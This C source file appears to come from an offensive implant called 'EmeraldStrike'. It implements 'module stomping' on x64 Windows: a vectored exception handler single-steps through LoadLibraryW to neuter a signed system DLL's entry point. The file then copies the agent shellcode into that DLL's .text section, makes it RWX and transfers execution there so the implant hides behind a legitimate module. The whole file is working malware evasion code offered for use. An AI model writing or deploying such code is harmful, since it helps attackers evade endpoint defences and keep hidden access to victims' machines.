/*
    EmeraldStrike - Module Stomping Implementation

    VEH-based LoadLibraryW interception to load a sacrificial DLL with
    neutered DllMain, then copy the agent shellcode into its .text section
    so all return addresses point into a legitimate signed module.

    x64 only. Gated by INCLUDE_EVASION_MODULE_STOMP.
*/

#include "config.h"
#include "common.h"

#ifdef INCLUDE_EVASION_MODULE_STOMP
#ifdef _WIN64

#include "evasion/module_stomp.h"

// ────────────────────────────────────────────────────────────────────
// Thread-local VEH context pointer.
// We cannot pass user data to a VEH handler, so we store the context
// in a thread-local via a well-known TEB slot. On x64, TEB->ArbitraryUserPointer
// at gs:[0x28] is available for this purpose. However, some runtimes
// use it, so we use a simple static - this is single-threaded at init.
// ────────────────────────────────────────────────────────────────────

static PINSTANCE g_ms_inst = nullptr;

// ────────────────────────────────────────────────────────────────────
// PE parsing helpers (PIC-safe, no CRT)
// ────────────────────────────────────────────────────────────────────

static BOOL ms_find_section(PVOID dll_base, const char* name,
                            PMS_SECTION_INFO out) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll_base;
    if (dos->e_magic != 0x5A4D) return FALSE;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)dll_base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    DWORD num = nt->FileHeader.NumberOfSections;

    for (DWORD i = 0; i < num; i++) {
        // Compare section name (8 bytes max, null-padded)
        const char* sn = (const char*)sec[i].Name;
        const char* cn = name;
        BOOL match = TRUE;
        for (int j = 0; j < 8; j++) {
            if (cn[j] == 0 && sn[j] == 0) break;
            if (cn[j] == 0 || sn[j] == 0 || cn[j] != sn[j]) { match = FALSE; break; }
        }
        if (match) {
            out->pBase = (PVOID)((PBYTE)dll_base + sec[i].VirtualAddress);
            out->dwVirtualSize = sec[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

// Find a single 0xC3 (ret) gadget in [start, start+len)
static PVOID ms_find_ret_gadget(PVOID start, SIZE_T len) {
    PBYTE p = (PBYTE)start;
    for (SIZE_T i = 0; i < len; i++) {
        if (p[i] == 0xC3) return (PVOID)(p + i);
    }
    return nullptr;
}

// ────────────────────────────────────────────────────────────────────
// VEH Handler - intercepts single-step exceptions during LoadLibraryW
// ────────────────────────────────────────────────────────────────────

static LONG CALLBACK ms_veh_handler(PEXCEPTION_POINTERS pInfo) {
    if (pInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    PINSTANCE inst = g_ms_inst;
    if (!inst) return EXCEPTION_CONTINUE_SEARCH;

    PMODULE_STOMP_CTX ctx = &inst->ModuleStomp;
    PVOID addr = pInfo->ExceptionRecord->ExceptionAddress;
    PCONTEXT pCtx = pInfo->ContextRecord;

    // ── NtCreateSection: upgrade handle permissions to SECTION_ALL_ACCESS ──
    if (addr == ctx->pNtCreateSection) {
        pCtx->Rdx = SECTION_ALL_ACCESS;
    }
    // ── NtMapViewOfSection: duplicate the section handle for later unmap/remap ──
    else if (addr == ctx->pNtMapViewOfSection && !ctx->hSacSection) {
        inst->Win32.DuplicateHandle(
            (HANDLE)-1,                 // source process (self)
            (HANDLE)pCtx->Rcx,          // source handle (first arg to NtMapViewOfSection)
            (HANDLE)-1,                 // target process (self)
            &ctx->hSacSection,          // output
            0, 0, DUPLICATE_SAME_ACCESS
        );
    }
    // ── RtlImageNtHeaderEx: find LDR_DATA_TABLE_ENTRY and patch EntryPoint ──
    else if (addr == ctx->pRtlImageNtHeaderEx && ctx->hSacSection) {
        // The PEB heap base - used to identify the LDR entry pointer
        PVOID pHeap = ((PPEB_FULL)__readgsqword(0x60))->ImageBaseAddress;
        // Actually we need the process heap for the heuristic
        // The heuristic: scan non-volatile registers for one that holds the
        // DllBase value (Rdx = image base passed to RtlImageNtHeaderEx).
        // Then scan again for a pointer into the heap that, when interpreted
        // as LDR_DATA_TABLE_ENTRY, has DllBase == Rdx.

        if (!ctx->bLdrEntryFound) {
            // Rdx holds the image base on entry to RtlImageNtHeaderEx
            DWORD64 imgBase = pCtx->Rdx;

            // Walk non-volatile registers looking for the LDR entry
            // On x64 the non-volatile regs are: Rbx, Rbp, Rdi, Rsi, R12-R15
            DWORD64 regs[] = {
                pCtx->Rbx, pCtx->Rbp, pCtx->Rdi, pCtx->Rsi,
                pCtx->R12, pCtx->R13, pCtx->R14, pCtx->R15
            };

            for (int i = 0; i < 8; i++) {
                DWORD64 val = regs[i];
                if (val < 0x10000) continue; // skip small values

                // Interpret as LDR_DATA_TABLE_ENTRY_FULL
                PLDR_DATA_TABLE_ENTRY_FULL entry = (PLDR_DATA_TABLE_ENTRY_FULL)val;

                // Guard access with a simple check - if this is truly a heap
                // allocation it should be readable. We can't use SEH in PIC,
                // but the VEH itself won't fault on reads within the Ldr heap.
                if (entry->DllBase == (PVOID)imgBase && entry->EntryPoint == nullptr) {
                    ctx->pSacLdrEntry = (PVOID)val;
                    ctx->bLdrEntryFound = TRUE;
                    break;
                }
            }
        } else if (ctx->bLdrEntryFound && !ctx->bEntryPatched) {
            // Second+ hit: check if EntryPoint has been set by Ldr
            PLDR_DATA_TABLE_ENTRY_FULL entry = (PLDR_DATA_TABLE_ENTRY_FULL)ctx->pSacLdrEntry;

            if (entry->EntryPoint != nullptr) {
                // Find .text section to locate a ret gadget
                MS_SECTION_INFO textInfo = {0};
                if (ms_find_section(entry->DllBase, ".text", &textInfo)) {
                    // Find a ret gadget past our stomp area
                    PVOID searchStart;
                    SIZE_T searchLen;

                    BOOL stompLarger = ((ULONG_PTR)textInfo.pBase + ctx->szStomp) >
                                       (ULONG_PTR)entry->EntryPoint;

                    if (stompLarger) {
                        searchStart = (PVOID)((PBYTE)textInfo.pBase + ctx->szStomp);
                        searchLen = textInfo.dwVirtualSize - ctx->szStomp;
                    } else {
                        searchStart = entry->EntryPoint;
                        searchLen = textInfo.dwVirtualSize -
                            (ULONG_PTR)((PBYTE)entry->EntryPoint - (PBYTE)textInfo.pBase);
                    }

                    ctx->pRetGadget = ms_find_ret_gadget(searchStart, searchLen);

                    if (ctx->pRetGadget) {
                        // Replace the entry point with ret gadget
                        entry->EntryPoint = ctx->pRetGadget;

                        // Set TlsIndex to -1 to skip LdrpHandleTlsData
                        entry->TlsIndex = (USHORT)-1;

                        ctx->bEntryPatched = TRUE;

                        // Store the .text info in context
                        ctx->SacText.pBase = textInfo.pBase;
                        ctx->SacText.dwVirtualSize = textInfo.dwVirtualSize;
                    }
                }

                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }
    }

    // Re-arm single step
    pCtx->EFlags |= 0x100;
    return EXCEPTION_CONTINUE_EXECUTION;
}

// ────────────────────────────────────────────────────────────────────
// Sacrifice DLL selection - pick randomly from known large signed DLLs
// ────────────────────────────────────────────────────────────────────

static const wchar_t* ms_select_sacrifice(PINSTANCE inst) {
    // Check which DLLs exist on this system
    // These are large, rarely loaded, signed Windows DLLs
    xwstr(_d0, L"C:\\Windows\\System32\\HostNetSvc.dll");
    xwstr(_d1, L"C:\\Windows\\System32\\WsmSvc.dll");
    xwstr(_d2, L"C:\\Windows\\System32\\localspl.dll");
    xwstr(_d3, L"C:\\Windows\\System32\\gpsvc.dll");

    const wchar_t* dlls[4];
    dlls[0] = _d0;
    dlls[1] = _d1;
    dlls[2] = _d2;
    dlls[3] = _d3;

    BOOL found[4] = {FALSE, FALSE, FALSE, FALSE};
    int numFound = 0;

    for (int i = 0; i < 4; i++) {
        if (inst->Win32.GetFileAttributesW(dlls[i]) != INVALID_FILE_ATTRIBUTES) {
            found[i] = TRUE;
            numFound++;
        }
    }

    if (numFound == 0) return nullptr;

    // Simple PRNG seeded from RDTSC (PIC-safe, no CRT rand/srand needed)
    DWORD lo, hi;
    __asm__ volatile("rdtsc" : "=a"(lo), "=d"(hi));
    DWORD seed = lo ^ hi;

    // xorshift32 to pick a random candidate
    for (int attempts = 0; attempts < 32; attempts++) {
        seed ^= seed << 13;
        seed ^= seed >> 17;
        seed ^= seed << 5;
        int idx = (int)(seed % 4);
        if (found[idx]) return dlls[idx];
    }

    // Fallback: return first found
    for (int i = 0; i < 4; i++) {
        if (found[i]) return dlls[i];
    }
    return nullptr;
}

// ────────────────────────────────────────────────────────────────────
// Module Stomp Init - main entry point
// ────────────────────────────────────────────────────────────────────

BOOL module_stomp_init(PINSTANCE inst) {
    DBG(inst, "[ES] ModuleStomp: starting");

    // Zero out the context
    es_memset(&inst->ModuleStomp, 0, sizeof(MODULE_STOMP_CTX));

    PMODULE_STOMP_CTX ctx = &inst->ModuleStomp;

    // ── Resolve additional APIs needed for module stomping ──
    PVOID k32 = inst->Modules.Kernel32;
    PVOID ntdll = inst->Modules.Ntdll;

    // LoadLibraryW (for loading the sacrifice DLL)
    typedef HMODULE (WINAPI *fnLoadLibraryW)(LPCWSTR);
    fnLoadLibraryW pLoadLibraryW = (fnLoadLibraryW)resolve_function(k32, H_LOADLIBRARYW);

    // AddVectoredExceptionHandler / RemoveVectoredExceptionHandler
    typedef PVOID (WINAPI *fnAddVEH)(ULONG, PVOID);
    typedef ULONG (WINAPI *fnRemoveVEH)(PVOID);
    fnAddVEH pAddVEH = (fnAddVEH)resolve_function(k32, H_ADDVECTOREDEXCEPTIONHANDLER);
    fnRemoveVEH pRemoveVEH = (fnRemoveVEH)resolve_function(k32, H_REMOVEVECTOREDEXCEPTIONHANDLER);

    // GetFileAttributesW (for checking sacrifice DLL existence)
    typedef DWORD (WINAPI *fnGetFileAttributesW)(LPCWSTR);
    fnGetFileAttributesW pGetFileAttrsW = (fnGetFileAttributesW)resolve_function(k32, H_GETFILEATTRIBUTESW);

    // NtFlushInstructionCache
    typedef NTSTATUS (NTAPI *fnNtFlushIC)(HANDLE, PVOID, SIZE_T);
    fnNtFlushIC pFlushIC = (fnNtFlushIC)resolve_function(ntdll, H_NTFLUSHINSTRUCTIONCACHE);

    // RtlImageNtHeaderEx (for VEH interception)
    typedef NTSTATUS (NTAPI *fnRtlImageNtHeaderEx)(ULONG, PVOID, ULONG64, PIMAGE_NT_HEADERS*);
    fnRtlImageNtHeaderEx pRtlImgHdr = (fnRtlImageNtHeaderEx)resolve_function(ntdll, H_RTLIMAGENTHEADEREX);

    // Validate critical APIs
    if (!pLoadLibraryW || !pAddVEH || !pRemoveVEH || !pGetFileAttrsW ||
        !inst->Win32.NtCreateSection || !inst->Win32.NtMapViewOfSection ||
        !pRtlImgHdr || !inst->Win32.VirtualProtect || !inst->Win32.DuplicateHandle) {
        DBG(inst, "[ES] ModuleStomp: API resolution failed");
        return FALSE;
    }

    // Store resolved API addresses for the VEH context (also store locally-resolved ones)
    inst->Win32.GetFileAttributesW = pGetFileAttrsW;

    // Store API addresses the VEH handler will compare against
    ctx->pNtCreateSection = (PVOID)inst->Win32.NtCreateSection;
    ctx->pNtMapViewOfSection = (PVOID)inst->Win32.NtMapViewOfSection;
    ctx->pRtlImageNtHeaderEx = (PVOID)pRtlImgHdr;

    // ── Calculate stomp size (agent shellcode = Base.Length) ──
    ctx->szStomp = inst->Base.Length;
    if (ctx->szStomp == 0) {
        DBG(inst, "[ES] ModuleStomp: Base.Length is zero");
        return FALSE;
    }

    // ── Select sacrifice DLL ──
    const wchar_t* sacName = ms_select_sacrifice(inst);
    if (!sacName) {
        DBG(inst, "[ES] ModuleStomp: no sacrifice DLL found");
        return FALSE;
    }

    // ── Set global context for VEH ──
    g_ms_inst = inst;

    // ── Register VEH handler (first handler = priority 1) ──
    PVOID hHandler = pAddVEH(1, (PVOID)ms_veh_handler);
    if (!hHandler) {
        DBG(inst, "[ES] ModuleStomp: AddVEH failed");
        g_ms_inst = nullptr;
        return FALSE;
    }

    // ── Set trap flag to begin single-stepping through LoadLibraryW ──
    __asm__ volatile("pushfq; or dword ptr [rsp], 0x100; popfq");

    // ── Load the sacrifice DLL (VEH will intercept) ──
    HMODULE hSac = pLoadLibraryW(sacName);

    // ── Remove VEH handler ──
    pRemoveVEH(hHandler);
    g_ms_inst = nullptr;

    if (!hSac) {
        DBG(inst, "[ES] ModuleStomp: LoadLibraryW failed");
        return FALSE;
    }

    ctx->pSacDllBase = (PVOID)hSac;

    // ── Validate VEH interception results ──
    if (!ctx->bEntryPatched) {
        DBG(inst, "[ES] ModuleStomp: VEH did not patch entry");
        return FALSE;
    }

    // ── Resolve .text and .pdata sections of sacrifice DLL ──
    if (ctx->SacText.pBase == nullptr || ctx->SacText.dwVirtualSize == 0) {
        // VEH should have filled this; try again
        if (!ms_find_section(ctx->pSacDllBase, ".text", &ctx->SacText)) {
            DBG(inst, "[ES] ModuleStomp: can't find sacrifice .text");
            return FALSE;
        }
    }

    // Validate sacrifice .text is large enough
    if (ctx->SacText.dwVirtualSize < ctx->szStomp) {
        DBG(inst, "[ES] ModuleStomp: sacrifice .text too small");
        return FALSE;
    }

    // Find .pdata
    ms_find_section(ctx->pSacDllBase, ".pdata", &ctx->SacPdata);

    // ── Make sacrifice .text writable and zero it ──
    DWORD oldProt = 0;
    inst->Win32.VirtualProtect(ctx->SacText.pBase, ctx->szStomp,
                                PAGE_READWRITE, &oldProt);
    es_memset(ctx->SacText.pBase, 0, ctx->szStomp);

    // ── Copy agent shellcode into sacrifice .text ──
    PVOID srcBase = inst->Base.Buffer;
    SIZE_T srcLen = inst->Base.Length;
    es_memcpy(ctx->SacText.pBase, srcBase, srcLen);

    // ── Copy agent .pdata into sacrifice .pdata (for correct stack unwinding) ──
    if (ctx->SacPdata.pBase && ctx->SacPdata.dwVirtualSize > 0) {
        // Parse agent PE headers to find .pdata section
        PIMAGE_DOS_HEADER agentDos = (PIMAGE_DOS_HEADER)srcBase;
        if (agentDos->e_magic == 0x5A4D) {
            PIMAGE_NT_HEADERS agentNt = (PIMAGE_NT_HEADERS)((PBYTE)srcBase + agentDos->e_lfanew);
            PIMAGE_SECTION_HEADER agentSec = IMAGE_FIRST_SECTION(agentNt);

            for (DWORD i = 0; i < agentNt->FileHeader.NumberOfSections; i++) {
                if (agentSec[i].Name[0] == '.' && agentSec[i].Name[1] == 'p' &&
                    agentSec[i].Name[2] == 'd' && agentSec[i].Name[3] == 'a' &&
                    agentSec[i].Name[4] == 't' && agentSec[i].Name[5] == 'a') {
                    DWORD pdataSize = agentSec[i].Misc.VirtualSize;
                    if (pdataSize > 0 && pdataSize <= ctx->SacPdata.dwVirtualSize) {
                        DWORD pdataOldProt = 0;
                        PVOID pdataAddr = ctx->SacPdata.pBase;
                        SIZE_T pdataRegion = ctx->SacPdata.dwVirtualSize;
                        inst->Win32.VirtualProtect(pdataAddr, pdataRegion,
                                                    PAGE_READWRITE, &pdataOldProt);

                        // Fill with 0xFF first (avoids issues with RUNTIME_FUNCTION ordering)
                        es_memset(ctx->SacPdata.pBase, 0xFF, ctx->SacPdata.dwVirtualSize);

                        // Copy agent's .pdata
                        es_memcpy(ctx->SacPdata.pBase,
                                  (PVOID)((PBYTE)srcBase + agentSec[i].PointerToRawData),
                                  pdataSize);

                        // Restore pdata protection
                        inst->Win32.VirtualProtect(pdataAddr, pdataRegion,
                                                    pdataOldProt, &pdataOldProt);
                    }
                    break;
                }
            }
        }
    }

    // ── Calculate the delta between old and new base for relocation ──
    PBYTE newBase = (PBYTE)ctx->SacText.pBase;
    PBYTE oldBase = (PBYTE)srcBase;
    LONG_PTR delta = (LONG_PTR)(newBase - oldBase);

    // ── Find the INSTANCE storage in the new copy ──
    // In standalone PIC mode, __InstanceStorage is at the end of the shellcode
    // (last 16KB of .text). The INSTANCE struct is accessed via _get_instance()
    // which uses an offset from the code base. We need to update Base.Buffer
    // in the NEW copy's INSTANCE.
    //
    // Since the entire shellcode is byte-copied, the new INSTANCE is at:
    //   newBase + (INSTANCE_offset_from_old_base)
    // The _get_instance() function uses RIP-relative addressing (x64), so it
    // will automatically point to the new copy's INSTANCE when executing from
    // the new location. We just need to update Base.Buffer there.

    // ── Locate the INSTANCE in the new copy ──
    //
    // The shellcode blob is copied verbatim, so the INSTANCE sits at the SAME
    // relative offset from the base in both copies. Derive it directly rather
    // than scanning for a magic value: __InstanceStorage is not guaranteed to
    // be 8-byte aligned inside the folded .text section, and an off += 8 scan
    // then steps straight over it (or, worse, matches a false positive).
    PINSTANCE newInst = (PINSTANCE)(newBase + ((PBYTE)inst - (PBYTE)oldBase));

    // The copied Base field must still hold the original pointer/length.
    if (newInst->Base.Buffer != srcBase || newInst->Base.Length != (ULONG)srcLen) {
        DBG(inst, "[ES] ModuleStomp: new INSTANCE sanity check failed");
        newInst = nullptr;
    }

    if (newInst) {
        // Update Base.Buffer to point at the new location
        newInst->Base.Buffer = (PVOID)newBase;

        // Copy the ModuleStomp context (section handle, sacrifice info)
        es_memcpy(&newInst->ModuleStomp, ctx, sizeof(MODULE_STOMP_CTX));

        // Preserve original allocation info for cleanup
        newInst->pOriginalAlloc = srcBase;
        newInst->szOriginalAlloc = srcLen;

        // Re-point the copy's __Instance global at the new storage.
        //
        // Do NOT use &__Instance here: that is a link-time VMA (near 0), not the
        // runtime address, so the offset arithmetic underflows. __Instance lives
        // 8 bytes before __InstanceStorage (entry.x64.asm: __Instance_offset is
        // a dd, then __Instance is a dq, then the 16KB storage), and inst points
        // at __InstanceStorage.
        PVOID* pOldInstGlobal = (PVOID*)((PBYTE)inst - sizeof(PVOID));
        ULONG_PTR instGlobalOff = (ULONG_PTR)((PBYTE)pOldInstGlobal - (PBYTE)oldBase);
        if (instGlobalOff < srcLen) {
            *(PVOID*)(newBase + instGlobalOff) = (PVOID)newInst;
        } else {
            DBG(inst, "[ES] ModuleStomp: __Instance offset out of range");
        }
    }

    // ── Make sacrifice .text executable ──
    // The stomped region contains both code and writable data (.data/.bss/INSTANCE).
    // Use RWX for the entire region. The sacrifice DLL was loaded as a signed
    // module, so the backing is still MEM_IMAGE - which is the primary evasion
    // benefit (file-backed memory, not anonymous private).
    inst->Win32.VirtualProtect(ctx->SacText.pBase, ctx->szStomp,
                                PAGE_EXECUTE_READWRITE, &oldProt);

    // ── Flush instruction cache ──
    if (pFlushIC) {
        pFlushIC((HANDLE)-1, nullptr, 0);
    }

    // ── Transfer execution to the new copy ──
    // CRITICAL: We are still executing from the OLD allocation (module_stomp_init
    // is part of the shellcode blob). We CANNOT zero or free the old allocation
    // before transferring. Instead, we record the old allocation in the new
    // INSTANCE so it can be cleaned up after the transfer.

    DBG(inst, "[ES] ModuleStomp: stomped, transferring execution");

    if (newInst) {
        // agent_main's offset from the shellcode base is identical in both copies.
        typedef VOID (*fn_agent_main)(PINSTANCE);
        ULONG_PTR agent_main_offset = (ULONG_PTR)agent_main - (ULONG_PTR)oldBase;
        fn_agent_main new_agent_main = (fn_agent_main)(newBase + agent_main_offset);

        // Guard: the target must land inside the sized stomp window, otherwise
        // the relocation model above is wrong and we must not jump.
        ULONG_PTR amAddr  = (ULONG_PTR)new_agent_main;
        ULONG_PTR amLimit = (ULONG_PTR)newBase + srcLen;
        if (amAddr < (ULONG_PTR)newBase || amAddr >= amLimit) {
            DBG(inst, "[ES] ModuleStomp: agent_main out of bounds in sacrifice");
            return FALSE;
        }

        DBG(inst, "[ES] ModuleStomp: jumping to new agent_main");
        new_agent_main(newInst);

        // agent_main should not return, but if it does:
        return TRUE;
    }

    // Fallback: new INSTANCE not found, can't transfer
    DBG(inst, "[ES] ModuleStomp: INSTANCE not found in new copy");
    return FALSE;
}

#endif // _WIN64
#endif // INCLUDE_EVASION_MODULE_STOMP
